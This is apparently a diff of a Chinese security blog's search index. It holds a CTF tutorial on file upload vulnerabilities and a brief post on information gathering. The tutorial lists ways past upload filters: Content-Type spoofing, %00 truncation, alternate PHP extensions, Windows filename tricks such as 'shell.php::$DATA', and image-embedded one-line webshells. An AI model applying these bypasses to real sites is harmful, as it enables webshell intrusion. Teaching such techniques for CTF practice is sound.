-<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">shell</span>.php.   <span class="built_in">shell</span>.php空格   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg   <span class="built_in">shell</span>. php::$DATA   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
-
-<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>&emsp;&emsp;有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。SQL注入同理，，例如:phphpp</p>
-<h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>&emsp;&emsp;后缀名本质上是不区分大小写滴，例如pHp，但后端检测的时候就说不准了，同理呢，SQL语句过滤也是这样的道理。要举一反三噢ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
-<h4 id="MIME检测"><a href="#MIME检测" class="headerlink" title="MIME检测"></a>MIME检测</h4><p>&emsp;&emsp;MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。用你的BP打开，类似于这些:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text/plain （纯文本）</span><br><span class="line">text/html （HTML文档）</span><br><span class="line">text/javascript （js代码）</span><br><span class="line">application/xhtml+xml （XHTML文档）</span><br><span class="line">image/gif （GIF图像）</span><br><span class="line">image/jpeg （JPEG图像）</span><br><span class="line">image/png （PNG图像）</span><br><span class="line">video/mpeg （MPEG动画）</span><br><span class="line">application/octet-stream （二进制数据）</span><br><span class="line">application/pdf （PDF文档）</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;检测方式：在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。绕过方法我们就只要将<font color=red>content-type</font>字段改为常见的允许放行的图片类型,例如<font color=blue>image&#x2F;gif</font>,从而绕过校验。</p>
-<h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>&emsp;&emsp;我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。比如<br><img data-src="/images/GIF%E6%9C%A8%E9%A9%AC.png" alt="GIF木马"></p>
-<h4 id="内容检测图片马绕过"><a href="#内容检测图片马绕过" class="headerlink" title="内容检测图片马绕过"></a>内容检测图片马绕过</h4><p>&emsp;&emsp;将一句话木马插入到一个合法的图片文件当中，然后用webshell管理工具(蚁剑)连接，当然这边建议你先用phpinfo试一下，一方面有的时候flag就在里面，另一方面能验证是否上传成功。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/119141986">图片马</a></p>
-<h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>&emsp;&emsp;这个就很高深了，需要熟练使用BP，入门建议先别看。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501">条件竞争</a></p>
-<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;文件上传目前常用的就几种，主要我也只会这几种，重点在于多做做题目，推荐题库：<a href="https://www.nssctf.cn/problem">NSSCTF</a>，<a href="https://buuoj.cn/">BUUCTF</a>，<a href="https://ctf.bugku.com/">BugkuCTF</a>,光上面几个就够你试的了，不详细的地方再去搜索一下，要是后续遇到新的方法我也会实时更新的。</p>
+    <title>信息收集（CTF基础篇）</title>
+    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
+    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有<br><font color=black><br>ctrl+U 查看源代码<br>F12  查看js脚本<br>robots.txt 文件泄露,在URL后面加上&#x2F;robots.txt,可能会给出flag或所在路径<br><a href="http://www.zip/">www.zip</a>   压缩包，同上用法<br>dirsearch   扫描文件，转至<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  抓包找响应头，转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
 ]]></content>
       <categories>
-        <category>PHP</category>
+        <category>WEB</category>
       </categories>
       <tags>
-        <tag>文件上传</tag>
+        <tag>基础</tag>
       </tags>
   </entry>
   <entry>
@@ -553,6 +525,47 @@
       </categories>
       <tags>
         <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2024/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<p>&emsp;&emsp;文件上传是利用服务端所提供给你的权力，本意是让你们上传一些有意义的东西，但一些人就从中发现了一些可以利用的漏洞，上传一句话木马进去，这就是典型的文件上传漏洞，靠我们去猜过滤，从而绕过它。那么有以下几种方式的过滤和绕过方法。</p>
+<h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><p>&emsp;&emsp;对于前端的概念就是我们能看到的源码的那种，我们可以打开F12或者ctrl+U找js代码，原理就是前端是客户端还没有向服务器发送任何消息时对<font color=red>本地</font>进行检测来判断是否满足上传的类型。<br>&emsp;&emsp;绕过方法</p>
+<ul>
+<li>删除或者禁用js(JavaScript) 各个浏览器有不同的方式</li>
+<li>使用代理上传文件，用BP抓包修改成符合要求的文件类型，使用方法转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a></li>
+</ul>
+<h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><p>&emsp;&emsp;这种的就不能靠抓包提前去改了，主要是通过黑白名单进行过滤检测。</p>
+<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><h5 id="解析漏洞（黑名单通用）"><a href="#解析漏洞（黑名单通用）" class="headerlink" title="解析漏洞（黑名单通用）"></a>解析漏洞（黑名单通用）</h5><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">.htaccess文件解析漏洞   <span class="comment">//重点常考点（有没有老师划重点的那味了- ̗̀(๑ᵔ⌔ᵔ๑)）</span></span><br><span class="line">apache解析漏洞</span><br><span class="line">IIS7.<span class="number">0</span> <span class="string">| IIS7.5 | Nginx的解析漏洞</span></span><br><span class="line">IIS6.<span class="number">0</span>解析漏洞</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;关于这些解析漏洞我就不细讲了，对照相应的搜索一下就可以了，这些漏洞后续也会在对应板块出现。</p>
+<h5 id="截断上传（黑名单通用）"><a href="#截断上传（黑名单通用）" class="headerlink" title="截断上传（黑名单通用）"></a>截断上传（黑名单通用）</h5><ul>
+<li>截断类型:PHP%00截断 (扩展想想还有哪个函数也是这样的)，例如1.php%00</li>
+<li>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断,同理，黑名单也可以用，不过我用得少</li>
+<li>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</li>
+</ul>
+<h4 id="改后缀"><a href="#改后缀" class="headerlink" title="改后缀"></a>改后缀</h4><p>&emsp;&emsp;将php木马改成满足条件的后缀即可，例如<font color=red>1.php &#x3D;&gt; 1.jpg</font></p>
+<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><h5 id="特殊的扩展名"><a href="#特殊的扩展名" class="headerlink" title="特殊的扩展名"></a>特殊的扩展名</h5><p>&emsp;&emsp;如果是黑名单的就可以钻空子，看有没有漏网之鱼，例如</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">比如:</span></span><br><span class="line">asa和cer之类</span><br><span class="line"><span class="section">asp: asa cer aspx</span></span><br><span class="line"><span class="section">jsp: jspx jspf</span></span><br><span class="line"><span class="section">php: php php3 php4 php5 phtml pht (划重点)</span></span><br><span class="line"><span class="section">exe: exee</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="利用windows的命名机制"><a href="#利用windows的命名机制" class="headerlink" title="利用windows的命名机制"></a>利用windows的命名机制</h5><p>&emsp;&emsp;在windows中，后缀名后面的点和空格都会被删除掉。例如</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">shell</span>.php.   <span class="built_in">shell</span>.php空格   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg   <span class="built_in">shell</span>. php::$DATA   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
+
+<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>&emsp;&emsp;有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。SQL注入同理，，例如:phphpp</p>
+<h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>&emsp;&emsp;后缀名本质上是不区分大小写滴，例如pHp，但后端检测的时候就说不准了，同理呢，SQL语句过滤也是这样的道理。要举一反三噢ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
+<h4 id="MIME检测"><a href="#MIME检测" class="headerlink" title="MIME检测"></a>MIME检测</h4><p>&emsp;&emsp;MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。用你的BP打开，类似于这些:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text/plain （纯文本）</span><br><span class="line">text/html （HTML文档）</span><br><span class="line">text/javascript （js代码）</span><br><span class="line">application/xhtml+xml （XHTML文档）</span><br><span class="line">image/gif （GIF图像）</span><br><span class="line">image/jpeg （JPEG图像）</span><br><span class="line">image/png （PNG图像）</span><br><span class="line">video/mpeg （MPEG动画）</span><br><span class="line">application/octet-stream （二进制数据）</span><br><span class="line">application/pdf （PDF文档）</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;检测方式：在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。绕过方法我们就只要将<font color=red>content-type</font>字段改为常见的允许放行的图片类型,例如<font color=blue>image&#x2F;gif</font>,从而绕过校验。</p>
+<h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>&emsp;&emsp;我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。比如<br><img data-src="/images/GIF%E6%9C%A8%E9%A9%AC.png" alt="GIF木马"></p>
+<h4 id="内容检测图片马绕过"><a href="#内容检测图片马绕过" class="headerlink" title="内容检测图片马绕过"></a>内容检测图片马绕过</h4><p>&emsp;&emsp;将一句话木马插入到一个合法的图片文件当中，然后用webshell管理工具(蚁剑)连接，当然这边建议你先用phpinfo试一下，一方面有的时候flag就在里面，另一方面能验证是否上传成功。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/119141986">图片马</a></p>
+<h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>&emsp;&emsp;这个就很高深了，需要熟练使用BP，入门建议先别看。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501">条件竞争</a></p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;文件上传目前常用的就几种，主要我也只会这几种，重点在于多做做题目，推荐题库：<a href="https://www.nssctf.cn/problem">NSSCTF</a>，<a href="https://buuoj.cn/">BUUCTF</a>，<a href="https://ctf.bugku.com/">BugkuCTF</a>,光上面几个就够你试的了，不详细的地方再去搜索一下，要是后续遇到新的方法我也会实时更新的。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
